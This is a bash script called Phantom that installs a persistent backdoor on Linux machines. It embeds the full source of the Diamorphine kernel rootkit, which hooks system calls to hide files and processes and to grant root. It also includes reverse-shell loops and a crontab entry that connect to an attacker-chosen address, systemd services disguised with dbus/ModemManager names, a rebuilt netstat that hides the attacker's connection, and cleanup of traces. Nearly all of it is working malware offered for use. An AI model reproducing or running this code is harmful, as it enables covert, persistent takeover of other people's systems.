#!/bin/bash

: 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and 
hides their pid, persisting through reboots. It also hides the files needed to perform the above and replaces netstat.

Copyright Â© 2018 Konstantinos Sarantopoulos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

The following are for the rootkit code which is mostly taken from: https://github.com/m0nad/Diamorphine

Copyright (c) 2014, Victor N. Ramos Mello
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * The name of the author may not be used to endorse or promote products
      derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'

ip="127.0.0.1/9999" #change this according to the listening ip and port 
#change also the ip and port in the _hiding variable (use search and AAA to find it in the document) 
#and the ip:port that netstat is gonna hide (use search and QQQ to find it in the document)

#that's the makefile for the usb-bus rootkit module
makefile=$(cat << \EOF
obj-m := usb-bus.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all:
	make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules 
EOF
)

#that's the code for the usb-bus rootkit module
diamorphine=$(cat << \EOF
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
	#include <linux/proc_ns.h>
#else
	#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
	#include <linux/file.h>
#else
	#include <linux/fdtable.h>
#endif

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

char* MAGIC_PREFIX[3] = {"dbus-org.freedesktop.Modem.service", "usb-bus", "dbus-org.freedesktop.ModemManager11.service"};
int indexes = sizeof(MAGIC_PREFIX)/sizeof(MAGIC_PREFIX[0]);

#define PF_INVISIBLE 0x10000000	

#define MODULE_NAME "diamorphine"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	//SIGMODINVIS = 63,
};

int i;
unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err; 
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		for (i = 0; i < indexes; i++) {
		if ((!proc &&
		(memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			if (i == indexes - 1) {
			prev = dir;
			}
		}
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		for (i = 0; i < indexes; i++) {
		if ((!proc && 
		(memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			if (i == indexes -1) {
			prev = dir;
			}
		}
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}

static inline void
tidy(void)
{
//	kfree(THIS_MODULE->notes_attrs);
//	THIS_MODULE->notes_attrs = NULL;
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
//	kfree(THIS_MODULE->mkobj.mp);
//	THIS_MODULE->mkobj.mp = NULL;
//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
//	kfree(THIS_MODULE->mkobj.drivers_dir);
//	THIS_MODULE->mkobj.drivers_dir = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
/*
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
	//			MODULE_NAME);
	module_hidden = 0;
}
*/

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	//list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = 1;
}

asmlinkage int
hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			/*if ((task->flags == PF_INVISIBLE)) {
				break;
			}*/
			task->flags = PF_INVISIBLE;
			//task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		/*
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		*/
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

static inline void
protect_memory(void)
{
	write_cr0(cr0);
}

static inline void
unprotect_memory(void)
{
	write_cr0(cr0 & ~0x00010000);
}

static int __init
diamorphine_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	protect_memory();

	return 0;
}

static void __exit
diamorphine_cleanup(void)
{
	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
EOF
)

#that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
_hiding=$(cat << \EOF
#!/bin/bash

insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko

hidden_pids=()

while true; do

#hide /bin/bash/bin/usb-bus and /bin/bash/sbin/usb-bus, which are our systemd services
bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }') 
#echo "bash_pid"
#echo "$bash_pid"
while read hide_pid; do
	cmdline=$(cat /proc/$hide_pid/cmdline)
	cat /proc/$hide_pid/cmdline &>/dev/null
	if [ "$(echo "$?")" == "1" ]; then
		continue
	fi
	if [ "$cmdline" == "/bin/bash/bin/usb-bus" ] || [ "$cmdline" == "/bin/bash/sbin/usb-bus" ]; then
		kill -31 $hide_pid
		#echo "hid systemd service pid: $hide_pid"
	fi
done <<< "$bash_pid"

#hide bash shells which our systemd service spawns
inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #(AAA) change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the 
#resulting hex and use it (without the 0x) in place of 0100007F, then convert the port from decimal to hex and use it in place of 270F)
#echo "inode_list"
#echo "$inode_list"
for (( i=1; i <= 65553; i=i+1 )); do
	if [ "${hidden_pids[i]}" != "" ]; then
		#echo "$i already on hidden_pids"
		continue
	fi
	socket=$(readlink /proc/$i/fd/0)
	while read inode_number; do
		if [ "socket:[$inode_number]" == "$socket" ]; then
			#echo "pid: $i inode_number: $inode_number"
			kill -31 $i
			#echo "hid bash pid: $i"
			hidden_pids[i]=$i
			#echo "hidden_pids[i] pid: ${hidden_pids[i]}"
		fi
	done <<< "$inode_list"
done

#sleep 10

done
EOF
)

#that's the script that's gonna open the bash connections
_bash=$(cat << EOF 
#!/bin/bash

while true; do

bash &>/dev/tcp/$ip  0>&1 #& 
sleep 60

done
EOF
)

#that's the code for the systemd service that's gonna do the hiding
_hiding_systemd=$(cat << \EOF 
[Unit]
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/bin/usb-bus
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)

#that's the code for the systemd service that's gonna open the bash connections
_bash_systemd=$(cat << \EOF 
[Unit]
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/etc/usb-bus
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)

mkfile=$(cat << \EOF	
diff --git a/Makefile b/Makefile
index dda982c..f96b174 100644
--- a/Makefile
+++ b/Makefile
@@ -608,6 +608,12 @@ endif # $(dot-config)
 # Defaults to vmlinux, but the arch makefile usually adds further targets
 all: vmlinux
 
+# force no-pie for distro compilers that enable pie by default
+KBUILD_CFLAGS += $(call cc-option, -fno-pie)
+KBUILD_CFLAGS += $(call cc-option, -no-pie)
+KBUILD_AFLAGS += $(call cc-option, -fno-pie)
+KBUILD_CPPFLAGS += $(call cc-option, -fno-pie)
+
 # The arch Makefile can set ARCH_{CPP,A,C}FLAGS to override the default
 # values of the respective KBUILD_* variables
 ARCH_CPPFLAGS :=
EOF
)	

netpatch=$(cat << \EOF
diff --git a/iptunnel.c b/iptunnel.c
index 4943d83..acfcbc7 100644
--- a/iptunnel.c
+++ b/iptunnel.c
@@ -26,7 +26,6 @@
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <netinet/in.h>
-#include <netinet/ip.h>
 #include <arpa/inet.h>
 #if defined(__GLIBC__) && (__GLIBC__ > 2 || (__GLIBC__ == 2 && __GLIBC_MINOR__ >= 1))
 #include <net/if.h>
@@ -36,6 +35,7 @@
 #include <linux/if_arp.h>
 #endif
 #include <linux/types.h>
+#include <linux/ip.h>
 #include <linux/if_tunnel.h>
 
 #include "config.h"
EOF
)

#print the user making the connection
echo "user making the connection: $USER"

#if the user making the connection is not root add a crontab entry which spawns backdoor bash shells	
if [ "$USER" != "root" ]; then
	printf "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1 &'\n" > /tmp/.cron
	crontab /tmp/.cron
	echo "added crontab for $USER"
	rm /tmp/.cron
	#exit to tell ncat that we are done with the script so the connection closes
	exit
fi

#if the user making the connection is root do the following:
if [ "$USER" == "root" ]; then
	#users=$(cat /etc/passwd | awk -F: '{ print $1 }')
	#read -d + -a usernames <<< "$users"
	#for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
	#	cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
	#	if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
	#		crontab -u ${usernames[i]} -r
	#		echo "removing ${usernames[i]} crontab"
	#	fi
	#done

	#---create the systemd services---
	#create the files that the systemd services are gonna use
	printf "$_hiding" >/bin/usb-bus
	chmod 777 /bin/usb-bus
	printf "$_bash" >/etc/usb-bus
	chmod 777 /etc/usb-bus	
	#create a systemd service to execute the _hiding script
	systemctl stop dbus-org.freedesktop.Modem.service &>/dev/null
	systemctl disable dbus-org.freedesktop.Modem.service &>/dev/null
	printf "$_hiding_systemd" >/etc/systemd/system/dbus-org.freedesktop.Modem.service
	systemctl daemon-reload &>/dev/null
	if [ "$?" == "0" ]; then
		echo "daemon-reload successful"
	else
		echo "daemon-reload unsuccessful"
	fi
	systemctl enable dbus-org.freedesktop.Modem &>/dev/null
	if [ "$?" == "0" ]; then
		echo "dbus-org.freedesktop.Modem.service-bus enabled"
	else
		echo "dbus-org.freedesktop.Modem.service-bus not enabled"
	fi
	systemctl restart dbus-org.freedesktop.Modem &>/dev/null
	if [ "$?" == "0" ]; then
		echo "dbus-org.freedesktop.Modem.service-bus started"
	else
		echo "dbus-org.freedesktop.Modem.service-bus not started"
	fi
	#create a systemd service to execute the _bash script
	systemctl stop dbus-org.freedesktop.ModemManager11 &>/dev/null
	systemctl disable dbus-org.freedesktop.ModemManager11 &>/dev/null
	printf "$_bash_systemd" >/etc/systemd/system/dbus-org.freedesktop.ModemManager11.service
	systemctl daemon-reload &>/dev/null
	if [ "$?" == "0" ]; then
		echo "daemon-reload successful"
	else
		echo "daemon-reload unsuccessful"
	fi
	systemctl enable dbus-org.freedesktop.ModemManager11 &>/dev/null
	if [ "$?" == "0" ]; then
		echo "dbus-org.freedesktop.ModemManager11.service-bus enabled"
	else
		echo "dbus-org.freedesktop.ModemManager11.service-bus not enabled"
	fi
	systemctl restart dbus-org.freedesktop.ModemManager11 &>/dev/null
	if [ "$?" == "0" ]; then
		echo "dbus-org.freedesktop.ModemManager11.service-bus started"
	else
		echo "dbus-org.freedesktop.ModemManager11.service-bus not started"
	fi
	
	#---make and insert the usb-bus rootkit module---
	#check if make and gcc are installed, otherwise install them
	ls /usr/bin/make &>/dev/null
	if [ "$?" != "0" ]; then
		m="make"
		echo "installing make..."
		apt-get install make -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "make installed successfully"
		else
			echo "make din't install"
		fi
	fi
	ls /usr/bin/gcc &>/dev/null
	if [ "$?" != "0" ]; then
		g="gcc"
		echo "installing gcc..."
		apt-get install gcc -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "gcc installed successfully"
		else
			echo "gcc didn't install"
		fi
	fi
	#make the usb-bus rootkit module
	if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
		mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
	fi
	printf "$makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
	printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
	echo "making usb-bus rootkit module..."
	make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
	#if make is unsuccessful patch the Makefile, get the headers needed for the module to work and make again
	if [ "$?" == "0" ]; then
		echo "make usb-bus rootkit module successful"
	else
		echo "make usb-bus rootkit module unsuccessful, patching Makefile and getting headers..."
		#copy the headers
		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
			cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
			if [ "$?" == "1" ]; then
				cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include 
			fi
		fi
		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/uapi/asm" ]; then
			cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/uapi/asm /usr/src/linux-headers-$(uname -r)/include/uapi
		fi
		gcc --version | grep "7\." &>/dev/null
		if [ "$?" == "0" ]; then
			if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
				cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
			fi
		fi
		#check if patch is installed, otherwise install it and patch the Makefile
		ls /usr/bin/patch &>/dev/null
		if [ "$?" != "0" ]; then
			p="patch"
		echo "installing patch..."
		apt-get install patch -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "patch installed successfully"
		else
			echo "patch din't install"
		fi
		fi
		location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')		
		printf "$mkfile" >/$location/mkfile.patch
		patch -d /$location </$location/mkfile.patch &>/dev/null
		if [ "$?" == "0" ]; then
			echo "patch source Makefile successful"
		else
			echo "patch source Makefile unsuccessful"
		fi
		rm /$location/mkfile.patch
		#make usb-bus rootkit module again
		echo "making usb-bus rootkit module again..."
		make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
		if [ "$?" == "0" ]; then
			echo "make usb-bus rootkit module successful"
		else
			echo "make usb-bus rootkit module unsuccessful"
		fi
	fi
	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
	#depmod -a #take care of dependencies otherwise you will have problems booting
	#remove the dirt
	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
	#check if insmod is installed. otherwise intall it and insert usb-bus rootkit module
	ls /bin/kmod &>/dev/null
	if [ "$?" != "0" ]; then
		echo "installing kmod..."
		apt-get install kmod -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "kmod installed successfully"
		else
			echo "kmod din't install"
		fi
	fi
	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
	if [ "$?" == "0" ]; then
		echo "usb-bus rootkit module inserted"
	else
		echo "usb-bus rootkit module not inserted"
	fi

	#---replace netstat---
	rm /tmp/net-tools.zip &>/dev/null
	rm  -r /tmp/net-tools-master &>/dev/null
	echo "replacing netstat..."
	#check if wget is installed, otherwise intall it and download net-tools.zip
	ls /usr/bin/wget &>/dev/null
	if [ "$?" != "0" ]; then
		w="wget"
		echo "installing wget..."
		apt-get install wget -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "wget installed successfully"
		else
			echo "wget din't install"
		fi
	fi
	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
	if [ "$?" == "0" ]; then
		echo "downloaded net-tools.zip"
	else
		echo "failed to download net-tools.zip"
	fi
	if [ "$w" == "wget" ]; then
		echo "removing wget..."
		apt-get purge wget -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "wget removed"
		else
			echo "wget not removed"
		fi
	fi
	#check if unzip is installed, otherwise intall it and unzip net-tools.zip
	ls /usr/bin/unzip &>/dev/null
	if [ "$?" != "0" ]; then
		z="unzip"
		echo "installing unzip..."
		apt-get install unzip -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "unzip installed successfully"
		else
			echo "unzip din't install"
		fi
	fi
	unzip -d /tmp /tmp/net-tools.zip >/dev/null
	if [ "$?" == "0" ]; then
		echo "unzipped net-tools.zip"
	else
		echo "failed to unzip net-tools.zip"
	fi
	rm /tmp/net-tools.zip
	if [ "$z" == "unzip" ]; then
		echo "removing unzip..."
		apt-get purge unzip -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "unzip removed"
		else
			echo "unzip not removed"
		fi
	fi
 	#replace netstat.c
	sed -i 's/printf("%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, "127.0.0.1:9999") == 0 ) {\n\t\tprintf("%-4s  %6ld %6ld %-*s/' /tmp/net-tools-master/netstat.c
	sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
	if [ "$?" == "0" ]; then
		echo "netstat.c replaced"
	else
		echo "netstat.c not replaced"
	fi
	#patch the Makefile
	printf "$netpatch" >/tmp/net-tools-master/net.patch
	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
	if [ "$?" == "0" ]; then
		echo "patch net-tools successful"
	else
		echo "patch net-tools unsuccessful"
	fi
	if [ "$p" == "patch" ]; then
		echo "removing patch..."
		apt-get purge patch -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "patch removed"
		else
			echo "patch not removed"
		fi
	fi
	#make update net-tools-master so netstat gets replaced
	yes "" | make -C /tmp/net-tools-master config &>/dev/null
	if [ "$?" == "0" ]; then
		echo "make config net-tools successful"
	else
		echo "make  config net-tools unsuccessful"
	fi
	make -C /tmp/net-tools-master &>/dev/null
	if [ "$?" == "0" ]; then
		echo "make net-tools-master successful"
	else
		echo "make net-tools-master unsuccessful"
	fi
	make update -C /tmp/net-tools-master  &>/dev/null
	if [ "$?" == "0" ]; then
		echo "netstat replaced"
	else
		echo "netstat not replaced"
	fi
	rm  -r /tmp/net-tools-master

	#remove make and gcc if they weren't installed
	if [ "$m" == "make" ]; then
		echo "removing make..."
		apt-get purge make -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "make removed"
		else
			echo "make not removed"
		fi
	fi
	if [ "$g" == "gcc" ]; then
		echo "removing gcc..."
		apt-get purge gcc -y &>/dev/null
		if [ "$?" == "0" ]; then
			echo "gcc removed"
		else
			echo "gcc not removed"
		fi
	fi

	#exit to tell ncat that we are done with the script so the connection closes
	exit
fi
